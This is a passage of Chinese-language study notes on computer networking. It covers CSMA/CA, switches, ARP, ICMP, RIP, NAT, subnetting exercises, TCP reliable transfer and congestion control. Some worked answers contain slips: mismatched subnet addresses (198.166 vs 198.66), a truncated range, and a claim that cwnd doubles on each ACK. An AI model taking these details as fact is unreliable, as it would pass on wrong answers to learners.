id="CSMA-CA">CSMA/CA</h3><ul><li><p>无线局域网不能简单地搬用 CSMA/CD 协议。因为：</p><ul><li>“碰撞检测”要求一个站点在发送本站数据的同时，还必须不间断地检测信道，但接收到的信号强度往往会远远小于发送信号的强度，在无线局域网的设备中要实现这种功能就花费过大。</li><li>即使能够实现碰撞检测的功能，并且在发送数据时检测到信道是空闲的时候，在接收端仍然有可能发生碰撞。</li></ul></li><li><p>改进的办法是把 CSMA 增加一个碰撞避免 CA（Collision Avoidance）功能。<br>802.11 就使用 CSMA/CA 协议。在使用 CSMA/CA 的同时，还增加使用停止等待协议。</p></li><li><p>CSMA/CA算法：</p><ol><li>若站点最初有数据要发送（而不是发送不成功再进行重传），且检测到信道空闲，在等待时间 DIFS 后，就发送整个数据帧。</li><li>否则，站点就要等检测到信道空闲并经过时间 DIFS 后，执行 CSMA/CA 协议的退避算法，启动退避计数器。在退避计数器减少到零之前，一旦检测到信道忙，就冻结退避计时器。一旦信道空闲，退避计时器就进行倒计时。</li><li>当退避计时器时间减少到零时（这时信道只可能是空闲的），站点就发送整个的帧并等待确认。</li><li>发送站若收到确认，就知道已发送的帧被目的站正确收到了。这时如果要发送第二帧，就要从上面的步骤 (2) 开始，执行 CSMA/CA 协议的退避算法，随机选定一段退避时间。若源站在规定时间内没有收到确认帧 ACK（由重传计时器控制这段时间），就必须重传此帧   （再次使用 CSMA/CA 协议争用接入信道），直到收到确认为止，或者经过若干次的重传失败后放弃发送。</li></ol><img src="https://oss.iuoyt.com/img/posts/image-20240702141124962.png" alt="CSMA/CA流程图" style="zoom:33%;" /></li></ul><h3 id="CRC（循环冗余检验）">CRC（循环冗余检验）</h3><ul><li><p>CRC（Cyclic Redundancy Check）是为了保证数据传输的可靠性，在计算机网络传输数据时采用的差错检测措施。</p></li><li><p>在发送端，先把数据划分为组。假定每组 k 个比特。 在每组 M 后面再添加供差错检测用的 n 位冗余码，然后一起发送出去。</p><img src="https://oss.iuoyt.com/img/posts/image-20240701143257266.png" alt="循环冗余检验" style="zoom: 50%;" /></li><li><p>计算方法详见<a href="https://www.iuoyt.com/posts/9bdadf86.html#%E5%BE%AA%E7%8E%AF%E5%86%97%E4%BD%99%E7%A0%81CRC%EF%BC%88%E5%A4%9A%E9%A1%B9%E5%BC%8F%E6%A0%A1%E9%AA%8C%EF%BC%89">计算题篇</a></p></li></ul><h3 id="网卡">网卡</h3><ul><li>网络接口板又称为通信适配器（adapter）或网络接口卡 NIC（Network Interface Card），或“网卡”。</li><li>适配器的重要功能：<ol><li>进行串行/并行转换</li><li>对数据进行缓存</li><li>在计算机的操作系统安装设备驱动程序</li><li>实现以太网协议</li></ol></li><li>网络接口卡（网卡）是连接主机与网络的基本设备<ul><li>每台主机都应配置一个或多个网卡；</li><li>每个网卡都有一个（或多个）网络接口；</li><li>不能独立工作，必须依赖于宿主主机。</li></ul></li><li>网卡工作在物理层和数据链路层</li><li>连接不同的局域网需要使用不同的网卡<ul><li>以太网卡</li><li>令牌环网卡</li><li>FDDI网卡</li><li>ATM网卡</li></ul></li></ul><h3 id="交换机（自学习）">交换机（自学习）</h3><ul><li><p>以太网交换机是一种即插即用设备，其内部的帧交换表（又称为地址表）是通过自学习算法自动地逐渐建立起来的。</p></li><li><p>交换机可以隔绝冲突域，但不隔绝广播域。</p><table><thead><tr><th style="text-align:center">隔绝比较？</th><th style="text-align:center">冲突域</th><th style="text-align:center">广播域</th></tr></thead><tbody><tr><td style="text-align:center">集线器Hub</td><td style="text-align:center">✖</td><td style="text-align:center">✖</td></tr><tr><td style="text-align:center">交换机Switch</td><td style="text-align:center">✔</td><td style="text-align:center">✖</td></tr><tr><td style="text-align:center">路由器Router</td><td style="text-align:center">✔</td><td style="text-align:center">✔</td></tr></tbody></table></li><li><p>自学习过程</p><img src="https://oss.iuoyt.com/img/posts/image-20240701150212840.png" alt="交换机自学习过程" style="zoom:50%;" /><details class="folding-tag" ><summary> 举例 </summary>              <div class='content'>              <ul><li><p>$A\to B$：</p><ul><li>A 先向 B 发送一帧，该帧从接口 1 进入到交换机</li><li>交换机收到帧后，先查找交换表。没有查到应从哪个接口转发这个帧给 B</li><li>交换机把这个帧的源地址 A 和接口 1 写入交换表中</li><li>交换机向除接口 1 以外的所有的接口广播这个帧</li><li>由于与该帧的目的地址不相符，C 和 D 将丢弃该帧</li></ul><img src="https://oss.iuoyt.com/img/posts/image-20240701145831555.png" alt="交换机自学习算法1" style="zoom: 50%;" /></li><li><p>$B\to A$：</p><ol><li>B 向 A 发送一帧，该帧从接口 3 进入到交换机</li><li>交换机收到帧后，先查找交换表。发现交换表中的 MAC 地址有 A，表明要发送给A的帧应从接口1转发出去。于是就把这个帧传送到接口 1 转发给 A。</li><li>交换机把这个帧的源地址 B 和接口 3 写入交换表中</li></ol><img src="https://oss.iuoyt.com/img/posts/image-20240701150030448.png" alt="交换机自学习算法2" style="zoom: 50%;" /></li></ul>              </div>            </details></li></ul><h2 id="第四章-网络层">第四章 网络层</h2><h3 id="ARP">ARP</h3><ul><li>ARP协议是用来找出一个机器（主机或路由器）的IP地址对应硬件地址的协议，其工作在网络层。</li><li>不管网络层使用的是什么协议，在实际网络的链路上传送数据帧时，最终还是必须使用硬件地址。</li><li>每一个主机都设有一个 ARP 高速缓存 (ARP cache)，里面有所在的局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。作用：减少 ARP 广播的数量</li><li>当主机 A 欲向本局域网上的某个主机 B 发送 IP 数据报时，就先在其 ARP 高速缓存中查看有无主机 B 的 IP 地址。<ul><li>如有，就可查出其对应的硬件地址，再将此硬件地址写入 MAC 帧，然后通过局域网将该 MAC 帧发往此硬件地址。</li><li>如没有， ARP 进程在本局域网上广播发送一个 ARP 请求分组。收到 ARP 响应分组后，将得到的 IP 地址到硬件地址的映射写入 ARP 高速缓存。</li></ul></li></ul><h3 id="ICMP">ICMP</h3><ul><li><p>为了更有效地转发 IP 数据报和提高交付成功的机会，在网际层使用了网际控制报文协议 ICMP (Internet Control Message Protocol)。</p></li><li><p>ICMP 允许主机或路由器报告差错情况和提供有关异常情况的报告。但 ICMP 不是高层协议（看起来好像是高层协议，因为 ICMP 报文是装在 IP 数据报中，作为其中的数据部分），而是 IP 层的协议。</p><img src="https://oss.iuoyt.com/img/posts/image-20240701151841411.png" alt="ICMP报文的格式" style="zoom:50%;" /></li></ul><h4 id="报文种类">报文种类</h4><ul><li><p>ICMP 报文的种类有两种，即 ICMP 差错报告报文和 ICMP 询问报文。</p></li><li><p>ICMP 差错报告报文有4种：</p><ul><li>终点不可达unreachable：路由器/主机不能交付IP数据报</li><li>时间超过timed out：IP数据报TTL=0</li><li>参数问题：数据报首部字段值不正确</li><li>改变路由（重定向）(Redirect)</li></ul><details class="folding-tag" ><summary> 不应发送ICMP差错报文的几种情况 </summary>              <div class='content'>              <ul><li>对 ICMP 差错报告报文不再发送 ICMP 差错报告报文。</li><li>对第一个分片的数据报片的所有后续数据报片都不发送 ICMP 差错报告报文。</li><li>对具有多播地址的数据报都不发送 ICMP 差错报告报文。</li><li>对具有特殊地址（如127.0.0.0 或 0.0.0.0）的数据报不发送 ICMP 差错报告报文。</li></ul>              </div>            </details></li><li><p>ICMP询问报文有2种：</p><ul><li>回送请求和回答报文：向特定主机发出询问并由其回复，以测试是否可达</li><li>时间戳请求和回答报文：请某台主机或路由器回答当前日期时间（用于时钟同步）</li></ul></li><li><p>常见应用举例：ping测试两个主机之间的连通性</p><img src="https://oss.iuoyt.com/img/posts/image-20240701153311015.png" alt="ping测试主机连通性" style="zoom: 33%;" /></li></ul><h3 id="RIP（路由更新）">RIP（路由更新）</h3><ul><li><p>路由信息协议 RIP (Routing Information Protocol) 是内部网关协议 IGP 中最先得到广泛使用的协议。RIP 协议要求网络中的每一个路由器都要维护从它自己到其他每一个目的网络的距离记录（最短距离）。</p></li><li><p>从一个路由器到直接连接的网络的距离定义为 1，从一个路由器到非直接连接的网络的距离定义为所经过的路由器数加 1。RIP 协议中的“距离”也称为“跳数”(hop count)，因为每经过一个路由器，跳数就加 1。</p></li><li><p>RIP 认为一个好的路由就是它通过的路由器的数目少，即“距离短”。RIP 允许一条路径最多只能包含 15 个路由器。“距离”的最大值为 16 时即相当于不可达。可见 RIP 只适用于小型互联网。</p></li><li><p>RIP 不能在两个网络之间同时使用多条路由。RIP 选择一个具有最少路由器的路由（即最短路由），哪怕还存在另一条高速(低时延)但路由器较多的路由。</p><details class="folding-tag" ><summary> 例题1 </summary>              <div class='content'>              <p>某自治系统内采用RIP协议，若该自治系统内的路由器R1收到其邻居路由器R2的距离矢量，其中包含信息&lt;net1,16&gt;，则能得出的结论是（    ）。<br>A. R2可以经过R1到达net1，跳数为17<br>B. R2可以到达net1，跳数为16<br>C. R1可以经过R2到达net1，跳数为17<br>D. R1不能经过R2到达net1</p>  <div class="hide-block"><button type="button" class="hide-button" style="">查看解答    </button><div class="hide-content"><p>参考答案：D</p><p>在RIP协议中，距离16表明目的网络不可达。因此，R2无法到达net1，R1也无法经过R2到达net1。</p></div></div>              </div>            </details><details class="folding-tag" ><summary> 例题2 </summary>              <div class='content'>              <p>假设R1、R2、R3采用RIP协议交换路由信息，且均已收敛。若R3检测到网络201.1.2.0/25不可达，并向R2通告一次新的距离向量，则R2更新后，其到达该网络的距离是（    ）。<br>A. 2B. 3C.16D. 17</p>  <img src="https://oss.iuoyt.com/img/posts/image-20240701160203785.png" alt="image-20240701160203785" style="zoom:33%;" />  <div class="hide-block"><button type="button" class="hide-button" style="">查看解答    </button><div class="hide-content"><p>参考答案：C</p><p>R2除了收到R3的更新报文(不可达)，也会收到R1发来的更新报文，误以为经过R1到达net。</p><img src="https://oss.iuoyt.com/img/posts/image-20240701160223206.png" alt="image-20240701160223206" style="zoom:33%;" /></div></div>              </div>            </details></li></ul><h4 id="协议特点">协议特点</h4><ol><li>仅和相邻路由器交换信息。</li><li>交换的信息是当前本路由器所知道的全部信息，即自己的路由表。</li><li>按固定的时间间隔交换路由信息，例如，每隔 30 秒。当网络拓扑发生变化时，路由器也及时向相邻路由器通告拓扑变化后的路由信息。</li></ol><h4 id="优缺点">优缺点</h4><ul><li>优点：实现简单、开销较小</li><li>缺点：<ol><li>RIP 限制了网络的规模，它能使用的最大距离为 15（16 表示不可达）。</li><li>路由器之间交换的路由信息是路由器中的完整路由表，因而随着网络规模的扩大，开销也就增加。</li><li>“坏消息传播得慢”，使更新过程的收敛时间过长。</li></ol></li></ul><h3 id="VPN">VPN</h3><ul><li><p>由于 IP 地址的紧缺，一个机构能够申请到的IP地址数往往远小于本机构所拥有的主机数。考虑到互联网并不很安全，一个机构内也并不需要把所有的主机接入到外部的互联网。假定在一个机构内部的计算机通信也是采用 TCP/IP 协议，那么从原则上讲，对于这些仅在机构内部使用的计算机就可以由本机构自行分配其 IP 地址。</p><ul><li>本地地址——仅在机构内部使用的 IP 地址，可以由本机构自行分配，而不需要向互联网的管理机构申请。</li><li>全球地址——全球唯一的 IP 地址，必须向互联网的管理机构申请。</li></ul></li><li><p>问题：在内部使用的本地地址就有可能和互联网中某个 IP 地址重合，这样就会出现地址的二义性问题。</p><p>解决：RFC 1918 指明了一些专用地址 (private address)。专用地址只能用作本地地址而不能用作全球地址。在互联网中的所有路由器，对目的地址是专用地址的数据报一律不进行转发。</p><ul><li>10.0.0.0 到 10.255.255.255：A类，或记为10.0.0.0/8，它又称为 24 位块</li><li>172.16.0.0 到 172.31.255.255：B类，或记为172.16.0.0/12，它又称为 20 位块</li><li>192.168.0.0 到 192.168.255.255：C类，或记为192.168.0.0/16，它又称为 16 位块</li></ul></li><li><p>VPN虚拟专用网利用公用的互联网作为本机构各专用网之间的通信载体。“专用网”是因为这种网络是为本机构的主机用于机构内部的通信，而不是用于和网络外非本机构的主机通信，同时并没有实现真正使用通信专线，VPN只是在效果上和真正的专用网一样。</p></li><li><p>构建：</p></li><li><p>如果专用网不同网点之间的通信必须经过公用的互联网，但又有保密的要求，那么所有通过互联网传送的数据都必须加密。一个机构要构建自己的 VPN 就必须为它的每一个场所购买专门的硬件和软件，并进行配置，使每一个场所的 VPN 系统都知道其他场所的地址。</p></li></ul><h3 id="NAT">NAT</h3><ul><li><p>NAT解决了专用网上专用地址无法和互联网上的主机通信问题，使用本地地址的主机在和外界通信时，都要在NAT路由器上将其本地地址转换成全球IP地址，才能和互联网连接。</p><img src="https://oss.iuoyt.com/img/posts/image-20240701162829279.png" alt="NAT路由器的工作原理" style="zoom:33%;" /></li><li><p>转换过程：</p><ol><li><p>内部主机 A 用本地地址 $IP_A$ 和互联网上主机 B 通信所发送的数据报必须经过 NAT 路由器。</p></li><li><p>NAT 路由器将数据报的源地址 $IP_A$ 转换成全球地址 $IP_G$ ，并把转换结果记录到NAT地址转换表中，目的地址 $IP_B$ 保持不变，然后发送到互联网。（第一次地址转换：替换源地址，将内部地址替换为全球地址）</p></li><li><p>NAT 路由器收到主机 B 发回的数据报时，知道数据报中的源地址是  $IP_B$  而目的地址是 $IP_G$  。</p></li><li><p>根据 NAT 转换表，NAT 路由器将目的地址$IP_G$ 转换为 $IP_A$​ ，转发给最终的内部主机 A。 （第二次转换：替换目的地址，将全球地址替换为内部地址）</p><table><thead><tr><th style="text-align:center">方向</th><th style="text-align:center">字段</th><th style="text-align:center">旧IP地址</th><th style="text-align:center">新IP地址</th></tr></thead><tbody><tr><td style="text-align:center">出</td><td style="text-align:center">源IP地址</td><td style="text-align:center">192.168.0.3</td><td style="text-align:center">172.38.1.5</td></tr><tr><td style="text-align:center">入</td><td style="text-align:center">目的IP地址</td><td style="text-align:center">172.38.1.5</td><td style="text-align:center">192.168.0.3</td></tr></tbody></table></li></ol></li><li><p>当 NAT 路由器具有 n 个全球 IP 地址时，专用网内最多可以同时有 n 台主机接入到互联网。这样就可以使专用网内较多数量的主机，轮流使用 NAT 路由器有限数量的全球 IP 地址。通过 NAT 路由器的通信必须由专用网内的主机发起。专用网内部的主机不能充当服务器用，因为互联网上的客户无法请求专用网内的服务器提供服务。</p></li><li><p>为了更加有效地利用 NAT 路由器上的全球IP地址，现在常用的 NAT 转换表把运输层的端口号也利用上。这样，就可以使多个拥有本地地址的主机，共用一个 NAT 路由器上的全球 IP 地址，因而可以同时和互联网上的不同主机进行通信。使用端口号的 NAT 叫做网络地址与端口号转换NAPT (Network Address and Port Translation)，而不使用端口号的 NAT 就叫做传统的 NAT (traditional NAT)。</p></li></ul><h3 id="划分子网-构造超网（路由器转发分组）">划分子网-构造超网（路由器转发分组）</h3><p>计算题可参考<a href="https://www.iuoyt.com/posts/9bdadf86.html#%E5%88%92%E5%88%86%E5%AD%90%E7%BD%91">划分子网</a>和<a href="https://www.iuoyt.com/posts/9bdadf86.html#%E6%9E%84%E9%80%A0%E8%B6%85%E7%BD%91">构造超网</a>。</p><h4 id="划分子网方法">划分子网方法</h4><ul><li><p>考虑网络中物理段的数量（要划分的子网数量）：$2^N-2$（N是掩码被扩展的位数即子网位）或$2^N$（全1和全0的子网号可用，默认）</p></li><li><p>每个物理段的主机的数量$2^M-2$（M是主机地址的可用位数），主机号不允许为全1或全0</p></li><li><p>步骤：</p><ol><li>确定子网位（确定网络种物理网段数量）</li><li>确定子网掩码</li><li>确定子网内IP地址的分配</li></ol><details class="folding-tag" ><summary> 例题1 </summary>              <div class='content'>              <p>一个公司申请到C类IP为198.166.1.0，需要划分6个子网，请分析各子网地址分配情况？</p>  <div class="hide-block"><button type="button" class="hide-button" style="">查看解答    </button><div class="hide-content"><p>分析：该公司需要有8个子网，加上子网号全 0 和全1的两种特殊地址，子网数量至少为 8；</p><ol><li><p>确定子网号的位长为3，可以用来分配的子网最多为8，满足用户要求。</p></li><li><p>子网掩码：由于划分8个子网，需在IP地址的第4字节划出3位供分配子网用，故子网掩码为：255.255.255.224；可用主机号5位。</p></li><li><p>地址分配：</p><table><thead><tr><th style="text-align:center">子网地址</th><th style="text-align:center">子网号</th><th style="text-align:center">主机号</th><th style="text-align:center">地址范围</th></tr></thead><tbody><tr><td style="text-align:center">198.166.1.0</td><td style="text-align:center">000</td><td style="text-align:center">00001-11110</td><td style="text-align:center">1-30</td></tr><tr><td style="text-align:center">198.66.1.32</td><td style="text-align:center">001</td><td style="text-align:center">00001-11110</td><td style="text-align:center">33-62</td></tr><tr><td style="text-align:center">198.66.1.64</td><td style="text-align:center">010</td><td style="text-align:center">00001-11110</td><td style="text-align:center">65-94</td></tr><tr><td style="text-align:center">198.66.1.96</td><td style="text-align:center">011</td><td style="text-align:center">00001-11110</td><td style="text-align:center">97-126</td></tr><tr><td style="text-align:center">198.66.1.128</td><td style="text-align:center">100</td><td style="text-align:center">00001-11110</td><td style="text-align:center">129-158</td></tr><tr><td style="text-align:center">198.66.1.160</td><td style="text-align:center">101</td><td style="text-align:center">00001-11110</td><td style="text-align:center">161-190</td></tr><tr><td style="text-align:center">198.66.1.192</td><td style="text-align:center">110</td><td style="text-align:center">00001-11110</td><td style="text-align:center">193-222</td></tr><tr><td style="text-align:center">198.66.1.224</td><td style="text-align:center">111</td><td style="text-align:center">00001-11110</td><td style="text-align:center">225-25</td></tr></tbody></table></li></ol></div></div>              </div>            </details><details class="folding-tag" ><summary> 例题2 </summary>              <div class='content'>              <p>某单位申请到一个 B 类 IP 地址，其网络标识为 130.53 ，现进行子网划分，若选用的子网掩码为 255.255.224.0<br>1）则可划分为多少个子网？<br>2）每个子网中的主机数最多为多少台？<br>3）请列出全部子网地址。</p>  <div class="hide-block"><button type="button" class="hide-button" style="">查看解答    </button><div class="hide-content"><ol><li><p>B类地址默认子网掩码为255.255.0.0，由子网掩码为255.255.224.0可得知，借用了3位划分子网，最多可划分子网个数=23=8（全1全0子网可用）</p></li><li><p>每个子网中的主机数$=2^{13}-2 =8190$台</p></li><li><p>全部子网地址为：</p><p>130.53.0.0（130.53.0.1~130.53.31.254）<br>130.53.32.0<br>130.53.64.0<br>130.53.96.0<br>130.53.128.0<br>130.53.160.0<br>130.53.192.0<br>130.53.224.0</p></li></ol></div></div>              </div>            </details></li></ul><h4 id="使用子网时分组的转发">使用子网时分组的转发</h4><ol><li>从收到的分组的首部提取目的 IP 地址 D。</li><li>先用各网络的子网掩码和 D 逐位相“与”，看是否和相应的网络地址匹配。若匹配，则将分组直接交付。否则就是间接交付，执行第三步。</li><li>若路由表中有目的地址为 D 的特定主机路由，则将分组传送给指明的下一跳路由器；否则，执行第四步。</li><li>对路由表中的每一行，将子网掩码和 D 逐位相“与”。若结果与该行的目的网络地址匹配，则将分组传送给该行指明的下一跳路由器；否则，执行第五步。</li><li>若路由表中有一个默认路由，则将分组传送给路由表中所指明的默认路由器；否则，执行第六步。</li><li>报告转发分组出错。</li></ol><details class="folding-tag" ><summary> 例题 </summary>              <div class='content'>              <p>已知互联网和路由器 R1 中的路由表。主机 H1 向 H2 发送分组。试讨论 R1 收到 H1 向 H2 发送的分组后查找路由表的过程。</p><img src="https://oss.iuoyt.com/img/posts/image-20240701170108380.png" alt="image-20240701170108380" style="zoom: 50%;" /><div class="hide-block"><button type="button" class="hide-button" style="">查看解答    </button><div class="hide-content"><ol><li><p>要发送的分组目的IP地址：128.30.33.138，H1 首先检查主机 128.30.33.138 是否连接在本网络上。如果是，则直接交付；否则，就送交路由器 R1，并逐项查找路由表。</p></li><li><p>H1 首先将本子网的子网掩码 255.255.255.128与分组的 IP 地址 128.30.33.138 逐比特相与”(AND 操作)</p><img src="https://oss.iuoyt.com/img/posts/image-20240701170242815.png" alt="地址比较" style="zoom:50%;" /><p>因此 H1 必须把分组传送到路由器 R1然后逐项查找路由表</p></li><li><p>路由器 R1 收到分组后就用路由表中第 1 个项目的子网掩码和 128.30.33.138 逐比特 AND 操作 ：255.255.255.128 AND 128.30.33.138 = 128.30.33.128     不匹配</p></li><li><p>再用路由表种第2个项目的子网掩码比较：255.255.255.128 AND 128.30.33.138 = 128.30.33.128，匹配，这表明子网 2 就是收到的分组所要寻找的目的网络。</p></li></ol></div></div>              </div>            </details><h2 id="第五章-运输层">第五章 运输层</h2><img src="https://oss.iuoyt.com/img/posts/image-20240702164004391.png" alt="使用UDP和TCP的典型应用和应用层协议" style="zoom:50%;" /><h3 id="传输控制协议TCP">传输控制协议TCP</h3><h4 id="特点">特点</h4><ul><li>面向连接的协议，提供面向连接服务；</li><li>其传送的运输协议数据单元TPDU是 TCP 报文；</li><li>支持点对点单播，不支持多播、广播；</li><li>提供可靠服务；</li><li>复杂。用于大多数应用，如：万维网、电子邮件、文件传送等。</li></ul><h4 id="端口划分">端口划分</h4><img src="https://oss.iuoyt.com/img/posts/image-20240702165624275.png" alt="端口划分" style="zoom:50%;" /><ul><li>服务器端使用的端口号<ul><li>熟知端口，数值一般为 0 ~ 1023。紧密绑定于一些特定的重要应用程序。</li><li>登记端口号，数值为 1024 ~ 49151，为没有熟知端口号的应用程序使用的。使用这个范围的端口号必须在 IANA 登记，以防止重复。</li></ul></li><li>客户端使用的端口号<ul><li>又称为短暂端口号，数值为 49152 ~ 65535，留给客户进程选择暂时使用。</li><li>当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其他客户进程以后使用。</li></ul></li></ul><h4 id="常见端口">常见端口</h4><img src="https://oss.iuoyt.com/img/posts/image-20240702165156386.png" alt="常见端口" style="zoom: 50%;" /><h3 id="可靠传输">可靠传输</h3><h4 id="停止等待协议">停止等待协议</h4><ul><li><p>“停止等待”就是每发送完一个分组就停止发送，等待对方的确认。在收到确认后再发送下一个分组。</p></li><li><p>无差错情况：A 发送分组 M1，发完就暂停发送，等待 B 的确认 (ACK)。B 收到了 M1 向 A 发送  ACK。A 在收到了对 M1 的确认后，就再发送下一个分组  M2。</p><img src="https://oss.iuoyt.com/img/posts/image-20240701171248664.png" alt="无差错情况" style="zoom:50%;" /></li><li><p>出现差错：在接收方 B 会出现两种情况</p><ol><li>B 接收 M1 时检测出了差错，就丢弃 M1，其他什么也不做（不通知 A ）。</li><li>M1 在传输过程中丢失了，这时 B 当然什么都不知道，也什么都不做。</li></ol><p>在这两种情况下，B 都不会发送任何信息。但A都必须重发分组，直到B正确接收为止，这样才能实现可靠通信（超时重传）：</p><ol><li>A 为每一个已发送的分组都设置了一个超时计时器。</li><li>A 只要在超时计时器到期之前收到了相应的确认，就撤销该超时计时器，继续发送下一个分组 M2 。</li><li>若A在超时计时器规定时间内没有收到B的确认，就认为分组错误或丢失，就重发该分组。</li></ol><p>若分组正确到达B，但B回送的确认丢失或延迟了，A未收到B的确认，会超时重发，B 可能会收到重复的 M1 。此时使用<strong>编号</strong>辨别重复分组：</p><ol><li>A为每个发送的分组编号。若B收到了编号相同的分组，则认为收到了重复分组，丢弃重复的分组，并回送确认。</li><li>B为发送的确认进行编号，指示是对哪一个分组的确认。</li><li>A根据确认及其编号，可以确定它是对哪一个分组的确认，避免重发。若为重复的确认，则将其丢弃。</li></ol></li><li><p>确认丢失：</p><ol><li>若 B 所发送的对 M1 的确认丢失了，那么 A 在设定的超时重传时间内不能收到确认，但 A 并无法知道：是自己发送的分组出错、丢失了，或者 是 B 发送的确认丢失了。因此 A 在超时计时器到期后就要重传 M1。</li><li>假定 B 又收到了重传的分组 M1。这时 B 应采取两个行动：<ul><li>丢弃这个重复的分组 M1，不向上层交付。</li><li>向 A 发送确认。不能认为已经发送过确认就不再发送，因为 A 之所以重传 M1 就表示 A 没有收到对 M1 的确认。</li></ul></li></ol></li><li><p>确认迟到：</p><ol><li>传输过程中没有出现差错，但 B 对分组 M1 的确认迟到了。</li><li>A 会收到重复的确认。对重复的确认的处理很简单：收下后就丢弃。</li><li>B 仍会收到重复的 M1，且同样要丢弃重复的 M1，并重传确认分组。</li></ol><img src="https://oss.iuoyt.com/img/posts/image-20240701171926578.png" alt="确认丢失与确认迟到" style="zoom:50%;" /></li></ul><h4 id="连续ARQ协议">连续ARQ协议</h4><img src="https://oss.iuoyt.com/img/posts/image-20240701172514926.png" alt="流水线传输" style="zoom:50%;" /><ul><li>流水线传输就是发送方可连续发送多个分组，不必每发完一个分组就停顿下来等待对方的确认。</li><li>连续ARQ协议基本思想：<ul><li>发送方一次可以发出多个分组。</li><li>使用滑动窗口协议控制发送方和接收方所能发送和接收的分组的数量和编号。</li><li>每收到一个确认，发送方就把发送窗口向前滑动。</li><li>接收方一般采用累积确认的方式（不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认，这样就表示：到这个分组为止的所有分组都已正确收到了 ）。</li><li>采用回退N（Go-Back-N）方法进行重传（发送5个分组，中间的第3个分组丢失。接收方只能对前两个分组发出确认，发送方重传后面的三个分组。→再退回来重传已发送过的N个分组）。</li></ul></li></ul><h5 id="滑动窗口协议">滑动窗口协议</h5><ul><li>发送窗口大小：允许发送的分组数量</li><li>接收窗口大小：允许接收的分组数量</li><li>步骤：<ol><li>初始化：发送方和接收方各自初始化一个窗口。发送窗口的起始位置为0，结束位置为0；接收窗口的起始位置为0，结束位置也为0。发送数据：发送方在发送数据时，会将数据帧编号，并将其放入发送窗口</li><li>中。发送窗口的上界表示要发送的下一个帧的序号，下界表示已经发送但尚未确认的帧的序号。</li><li>接收确认：接收方接收到数据帧后，会检查帧的序号是否在接收窗口内。如果在接收窗口内，则接收方会发送一个确认帧给发送方，表示该帧已经被成功接收并处理。</li><li>窗口滑动：随着数据的传输，发送窗口会不断向前滑动，即发送窗口的结束位置逐渐增加。同时，接收窗口也会根据实际情况进行调整，以适应网络状况和接收能力。</li><li>流量控制：通过动态调整发送窗口的大小，可以控制发送方的发送速度，防止发送方发送速度过快而导致接收方来不及处理数据。这种机制有助于优化网络资源的利用，避免网络拥塞。</li><li>终止条件：当发送窗口的结束位置超过最大允许的帧数时，发送方停止发送数据。此时，如果还有未确认的数据帧，发送方需要等待接收方的确认。</li></ol></li></ul><h5 id="累积确认">累积确认</h5><img src="https://oss.iuoyt.com/img/posts/image-20240701173328838.png" alt="累积确认" style="zoom:50%;" /><h5 id="Go-Back-N（回退N）">Go-Back-N（回退N）</h5><img src="https://oss.iuoyt.com/img/posts/image-20240701173419356.png" alt="回退N" style="zoom:50%;" /><h3 id="拥塞控制">拥塞控制</h3><h4 id="拥塞控制的一般原理">拥塞控制的一般原理</h4><ul><li><p>在某段时间，若对网络中某资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。这种现象称为拥塞。</p></li><li><p>拥塞控制和流量控制的区别：</p><ul><li>拥塞控制：防止过多的数据注入到网络中，使网络中的路由器或链路不致过载。是一个全局性的过程，涉及到与降低网络传输性能有关的所有因素</li><li>流量控制：抑制发送端发送数据的速率，以使接收端来得及接收。是点对点通信量的控制，是端到端的问题</li></ul></li><li><p>控制方式</p><ul><li><p>开环控制：在设计网络时，事先考虑周全，力求工作时不发生拥塞</p></li><li><p>闭环控制：在发生拥塞后，采取措施进行控制，消除拥塞。</p></li><li><p>闭环控制的常见措施：</p><ul><li>监测网络系统，以便检测到拥塞在何时、何处发生</li><li>将拥塞发生的信息传送到可采取行动的地方</li><li>调整网络系统的运行以解决出现的问题</li></ul><p>解决思路：</p><ul><li>增加网络可用资源<br>减少用户对资源的需求</li></ul></li></ul></li></ul><h4 id="TCP的拥塞控制方法">TCP的拥塞控制方法</h4><ul><li><p>TCP 采用基于窗口的方法进行拥塞控制，该方法属于闭环控制方法。TCP发送方维持一个拥塞窗口 cwnd (Congestion Window)，根据网络的拥塞情况，发送端利用拥塞窗口大小调整发送的数据量。发送窗口大小不仅取决于接收方窗口，还取决于网络的拥塞状况，所以真正的发送窗口值为：$min(接收方窗口值，拥塞窗口值)$​</p></li><li><p>TCP有四种拥塞控制算法：慢开始、拥塞避免、快重传、快恢复</p></li><li><p>慢开始门限状态变量 ssthresh：</p><ul><li>当 cwnd &lt; ssthresh 时，使用慢开始算法。</li><li>当 cwnd &gt; ssthresh 时，停止使用慢开始算法而改用拥塞避免算法。</li><li>当 cwnd = ssthresh 时，既可使用慢开始算法，也可使用拥塞避免算法。</li></ul></li><li><p>出现拥塞时的处理：</p><ul><li>ssthresh = max (cwnd/2，2)</li><li>cwnd = 1</li><li>执行慢开始算法</li></ul><p>目的：迅速减少主机发送到网络中的分组数，使得发生拥塞的路由器有足够时间把队列中积压的分组处理完毕。</p></li></ul><h5 id="慢开始">慢开始</h5><ul><li><p>目的：用来确定网络的负载能力或拥塞程度。</p></li><li><p>算法的思路：由小到大逐渐增大拥塞窗口数值。</p></li><li><p>两个变量：</p><ul><li>拥塞窗口：设置初始拥塞窗口值（1~2最大报文段（旧标准）/ 2~4最大报文段（RFC 5681）），窗口值逐渐增大</li><li>慢开始门限：防止拥塞窗口增长过大引起网络拥塞</li></ul><img src="https://oss.iuoyt.com/img/posts/image-20240702153013613.png" alt="慢开始" style="zoom:50%;" /><p>发送方每收到一个对新报文段的确认（重传不包括）就使 cwnd 加倍。</p></li></ul><h5 id="拥塞避免算法">拥塞避免算法</h5><ul><li><p>思路：让拥塞窗口 cwnd 缓慢地增大，避免出现拥塞。</p></li><li><p>每经过一个传输轮次，拥塞窗口 cwnd = cwnd + 1。使拥塞窗口 cwnd 按线性规律缓慢增长。在拥塞避免阶段，具有 “加法增大” (Additive Increase) 的特点。</p><img src="https://oss.iuoyt.com/img/posts/image-20240702153154849.png" alt="拥塞避免算法" style="zoom: 50%;" /><p>在超时之前，每经过一个传输轮次就使 cwnd 加 1。</p></li></ul><h5 id="快重传">快重传</h5><ul><li>发送方只要一连收到三个重复确认，就知道接收方确实没有收到报文段，因而应当立即进行重传（即“快重传”），这样就不会出现超时，发送方也不会误认为出现了网络拥塞。（即更早地重传丢失报文段，不必等重传计时器超时才重发）</li><li>使用快重传可以使整个网络的吞吐量提高约20%。</li></ul><img 